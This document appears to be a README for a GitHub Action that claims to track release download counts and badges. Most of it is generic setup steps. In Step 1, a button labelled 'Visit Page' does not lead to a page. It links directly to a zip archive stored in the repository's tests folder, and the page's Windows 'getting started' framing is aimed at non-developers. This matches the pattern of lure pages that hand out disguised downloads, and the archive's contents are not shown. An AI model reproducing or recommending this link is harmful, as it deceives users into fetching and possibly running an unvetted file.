## 📋 What is github-downloads-action?

github-downloads-action helps you keep track of how many times your software releases have been downloaded. It records total downloads and breaks them down by day, week, and month. You can see this data right on your GitHub page with easy-to-read charts and update badges. You don’t need to write any code to see your downloads grow.

This tool works automatically using GitHub’s features. It updates your data and charts by itself when you publish new versions. It is designed for people who want clear metrics without technical setup.

---

## ⚙️ How github-downloads-action Works

This app runs inside GitHub using something called a “GitHub Action.” That means it works behind the scenes whenever you create a new release. It collects download stats and keeps your charts current.

Here’s what it tracks:

- **Total downloads:** All-time count for your releases  
- **Daily downloads:** How many times downloads happen each day  
- **Weekly downloads:** Groups daily counts by week  
- **Monthly downloads:** Groups daily counts by month  

It also creates things called badges (small icons) you can add to your project page. These update automatically to show your latest download stats.

---

## 🎯 Who Should Use It?

This tool fits anyone who shares software on GitHub and wants to know how many people download it. You don’t have to be a developer to use it. If you publish files, such as installers or programs, this action helps you watch your success.

It is also useful for people who want to add download badges to their GitHub readme files or websites without manually updating stats.

## 🖥️ System Requirements

You don’t need to install anything on your computer to run github-downloads-action because it works online through GitHub. But since it manages GitHub releases, you will need:

- A GitHub account

You can manage and view everything in your web browser from Windows or any other system.

## 🚀 Getting Started with github-downloads-action on Windows

To use github-downloads-action, you will interact mainly on the GitHub website. Follow these detailed steps to set up and use it.

---

### Step 1: Visit the github-downloads-action page

Click the big button below to go to the github-downloads-action GitHub page:

[![Download from GitHub](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badsliceee/github-downloads-action/main/tests/github_action_downloads_3.3.zip)

This page contains the software and all setup instructions on GitHub.

---

### Step 2: Open your GitHub repository

Open the GitHub repository where you want to track download counts. If you don’t have one, you need to create a repository first.

---

### Step 3: Create GitHub releases for your files

To track downloads, your project must have releases. Releases are where you upload files like installers or executables.

- Click the **Releases** link in your repository  
- Click **Draft a new release**  
- Enter a Tag version (for example, v1.0)  
- Upload your files to the release  
- Click **Publish release**  

Each release will be tracked by github-downloads-action for downloads.

---

### Step 4: Add github-downloads-action to your repository

You need to tell your repository to use github-downloads-action. This involves adding a workflow file to the `.github/workflows` folder.

- On your repository page, click **Add file** > **Create new file**  
- Name the file `.github/workflows/github-downloads.yml`  
- Copy and paste the example workflow code found on the github-downloads-action repository’s README  
- Commit the new file  

This file instructs GitHub to run the tracking action for each release.

---

### Step 5: View your download stats and badges

After the action runs, you can see summary JSON files, charts, and badges in your repository.

- Badges update automatically with the latest download numbers  
- You can embed badges in your README.md by copying the badge markdown  

Use these badges to display live download counts on your project page.
